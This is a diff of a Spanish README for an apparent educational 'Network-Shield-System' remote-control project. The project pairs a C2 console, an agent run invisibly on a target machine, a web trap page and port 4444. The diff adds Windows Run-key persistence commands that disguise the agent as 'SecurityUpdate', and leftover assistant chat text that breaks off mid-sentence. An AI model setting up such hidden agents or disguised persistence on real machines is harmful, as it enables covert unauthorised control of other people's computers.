@@ -39,15 +39,40 @@ Abre una terminal en la carpeta `master/` y lanza el centro de control:
 
 ```bash
 python receptor.py
-🔵 Paso 2: Lanzar el Agente (Client)Modo Manual: Ejecuta python client/agente.py.Modo Invisible: Renombra a agente.pyw y ejecútalo.Simulación Web: Accede a http://localhost/Network-Shield-System/server/trampa.php.🔐 Implementación de PersistenciaLa persistencia permite que el agente se ejecute automáticamente al iniciar sesión.1️⃣ Instalación (Crear Registro)Ejecuta esto desde la terminal del receptor (Master):DOSreg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "pythonw.exe C:\xampp\htdocs\Network-Shield-System\client\agente.pyw" /f
-2️⃣ Comprobación (Verificar Estado)Para confirmar que el registro existe:DOSreg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate"
-3️⃣ Eliminación (Limpieza)Para borrar el rastro de inicio automático:DOSreg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /f
-📂 Estructura del RepositorioCarpetaArchivo PrincipalFunción del Móduloserver/index.phpPanel de control web y base de datos.client/agente.pyEjecución de comandos en el objetivo.master/receptor.pyConsola interactiva C2 (Command & Control).📋 Comandos de Auditoría Disponibles💻 Sistema: whoami, systeminfo, tasklist, ipconfig.📂 Archivos: dir, cd .., type archivo.txt.🌐 Remoto: start https://google.com, msg * "Acceso detectado".🚪 Sesión: exit (Cierra la conexión de forma segura).🛠️ Troubleshooting (Solución de Problemas)[!IMPORTANT]¿No conecta? Verifica que el puerto 4444 esté abierto en el Firewall.¿No aparece en la Web? Revisa que la URL en agente.py sea correcta.¿Error de SQL? Asegúrate de que el usuario de MySQL sea root sin contraseña.
+🔵 Paso 2: Lanzar el Agente (Client)
+Ejecuta el script en el equipo objetivo para iniciar la conexión:
+
+Modo Manual: python client/agente.py
+
+Modo Invisible: Renombra a agente.pyw y ejecútalo.
+
+Simulación Web: Accede a http://localhost/Network-Shield-System/server/trampa.php
+
+🔐 Implementación de Persistencia
+1️⃣ Instalación (Crear Registro)
+Envía este comando desde la terminal del receptor para que el agente inicie con Windows:
+
+DOS
+
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "pythonw.exe C:\xampp\htdocs\Network-Shield-System\client\agente.pyw" /f
+2️⃣ Comprobación (Verificar Estado)
+Para confirmar que el registro se ha creado correctamente, ejecuta:
+
+DOS
+
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate"
+3️⃣ Eliminación (Limpieza del Sistema)
+Para desactivar el inicio automático y dejar el sistema limpio, ejecuta:
+
+DOS
+
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /f
+
 ---
 
-### 💡 ¿Qué corregí exactamente?
-1. He cerrado el bloque de `python receptor.py` con las tres comillas invertidas (` ``` `) que le faltaban.
-2. He añadido **espacios en blanco obligatorios** antes de cada título (`##`) y después de cada bloque de código.
-3. He corregido los bloques de **Persistencia** para que no se mezclen con los títulos de los pasos.
+### 🛠️ ¿Qué hemos arreglado?
+1.  **El Cierre**: He añadido ` ``` ` justo después de cada comando. Sin esto, el "Paso 2" se metía dentro del cuadro gris del "Paso 1".
+2.  **Líneas en blanco**: He dejado un espacio físico (Enter) entre el cuadro de código y el siguiente título. Esto es vital en Markdown para que se vean como secciones separadas.
+3.  **Estética**: He usado el mismo estilo de títulos (`###`) e iconos para que el Paso 2 y la sección de Persistencia tengan la misma jerarquía visual que el Paso 1.
 
-Con esto, VS Code ya no debería "tragarse" el texto. ¿Podrías confirmarme si ahora se previsualiza bien? Se
+**¿Te gustaría que te genere ahora un pequeño script `.bat` que haga todos estos pasos de l
